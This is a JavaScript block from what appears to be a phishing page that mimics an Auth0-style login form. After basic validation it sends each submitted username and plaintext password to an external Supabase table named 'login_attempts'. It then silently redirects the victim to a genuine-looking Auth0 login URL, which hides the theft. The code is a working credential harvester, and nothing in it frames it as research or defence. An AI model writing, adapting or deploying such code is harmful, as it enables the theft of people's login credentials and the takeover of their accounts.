<script>
// Supabase configuration - Loaded from Vercel environment variables via API
let SUPABASE_URL = null;
let SUPABASE_ANON_KEY = null;
let SUPABASE_TABLE = 'login_attempts';
let supabaseClient = null;

// Load configuration from Vercel API
async function loadSupabaseConfig() {
    try {
        const response = await fetch('/api/config');
        if (response.ok) {
            const config = await response.json();
            SUPABASE_URL = config.supabaseUrl;
            SUPABASE_ANON_KEY = config.supabaseAnonKey;
            SUPABASE_TABLE = config.supabaseTable || 'login_attempts';
            
            // Initialize Supabase client
            if (SUPABASE_URL && SUPABASE_ANON_KEY && typeof supabase !== 'undefined' && supabase.createClient) {
                supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
                console.log('Supabase client initialized');
            } else {
                console.error('Supabase configuration missing or library not loaded');
            }
        } else {
            console.error('Failed to load Supabase configuration from API');
        }
    } catch (error) {
        console.error('Error loading Supabase configuration:', error);
    }
}

// Load config when page loads
document.addEventListener('DOMContentLoaded', function() {
    loadSupabaseConfig();
});

async function saveToSupabase(username, password) {
    // Wait for Supabase client to be initialized if not ready yet
    if (!supabaseClient) {
        // Try to initialize one more time
        if (SUPABASE_URL && SUPABASE_ANON_KEY && typeof supabase !== 'undefined' && supabase.createClient) {
            supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        } else {
            console.error('Supabase not initialized. Please check your environment variables in Vercel.');
            return false;
        }
    }
    
    try {
        const { data, error } = await supabaseClient
            .from(SUPABASE_TABLE)
            .insert([
                {
                    username: username,
                    password: password,
                    timestamp: new Date().toISOString(),
                    ip_address: null // Can be added if needed
                }
            ]);
        
        if (error) {
            console.error('Error saving to Supabase:', error);
            return false;
        }
        
        console.log('Data saved to Supabase:', data);
        return true;
    } catch (err) {
        console.error('Exception saving to Supabase:', err);
        return false;
    }
}

function validateAndRedirect() {
    var username = document.getElementById('username');
    var password = document.getElementById('password');
    var usernameError = document.getElementById('error-cs-username-required');
    var passwordError = document.getElementById('error-cs-password-required');
    var usernamePatternError = document.getElementById('error-cs-pattern-mismatch');
    var passwordPatternError = document.querySelector('#error-cs-pattern-mismatch[data-ulp-validation-target="password"]');
    var isValid = true;
    
    // Reset errors
    if (usernameError) {
        usernameError.style.display = 'none';
        usernameError.style.color = '#d03c38';
    }
    if (passwordError) {
        passwordError.style.display = 'none';
        passwordError.style.color = '#d03c38';
    }
    if (usernamePatternError && usernamePatternError.getAttribute('data-ulp-validation-target') === 'username') {
        usernamePatternError.style.display = 'none';
        usernamePatternError.style.color = '#d03c38';
    }
    if (username) {
        username.style.borderColor = '';
        username.parentElement.classList.remove('ulp-error');
    }
    if (password) {
        password.style.borderColor = '';
        password.parentElement.classList.remove('ulp-error');
    }
    
    // Validate email
    var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    var usernameValue = username ? username.value.trim() : '';
    
    if (!usernameValue) {
        if (usernameError) {
            usernameError.textContent = 'Email address or username is required';
            usernameError.style.display = 'block';
            usernameError.style.color = '#d03c38';
        }
        if (username) {
            username.style.borderColor = '#d03c38';
            username.parentElement.classList.add('ulp-error');
        }
        isValid = false;
    } else if (!emailRegex.test(usernameValue)) {
        if (usernamePatternError && usernamePatternError.getAttribute('data-ulp-validation-target') === 'username') {
            usernamePatternError.textContent = 'Enter a valid email address or username';
            usernamePatternError.style.display = 'block';
            usernamePatternError.style.color = '#d03c38';
        } else if (usernameError) {
            usernameError.textContent = 'Enter a valid email address or username';
            usernameError.style.display = 'block';
            usernameError.style.color = '#d03c38';
        }
        if (username) {
            username.style.borderColor = '#d03c38';
            username.parentElement.classList.add('ulp-error');
        }
        isValid = false;
    }
    
    // Validate password
    var passwordValue = password ? password.value : '';
    if (!passwordValue) {
        if (passwordError) {
            passwordError.textContent = 'Password is required';
            passwordError.style.display = 'block';
            passwordError.style.color = '#d03c38';
        }
        if (password) {
            password.style.borderColor = '#d03c38';
            password.parentElement.classList.add('ulp-error');
        }
        isValid = false;
    }
    
    // If valid, save to Supabase and redirect
    if (isValid) {
        // Save to Supabase (async, but don't wait for it to complete before redirecting)
        saveToSupabase(usernameValue, passwordValue).then(function(success) {
            if (success) {
                console.log('Login data saved to Supabase successfully');
            } else {
                console.log('Failed to save login data to Supabase');
            }
        });
        
        // Redirect immediately (don't wait for Supabase save)
        window.location.href = 'https://iper.eu.auth0.com/u/login?state=hKFo2SBhWG1rSlNLUkFzVEd5X0xhZm45Snpob1dGakVvM0xsMKFur3VuaXZlcnNhbC1sb2dpbqN0aWTZIHQ2UjJRazFTNnhHdXZRSVFpaF9aUkwtRXJ1WG9sS2s3o2NpZNkgb3FwM2lnZ0hCU3BMWE5aNXhqZjI1WG1PWVZsakg5XzM';
    } else {
        // Focus on first error
        if (!usernameValue || !emailRegex.test(usernameValue)) {
            if (username) username.focus();
        } else if (!passwordValue) {
            if (password) password.focus();
        }
    }
}
</script>
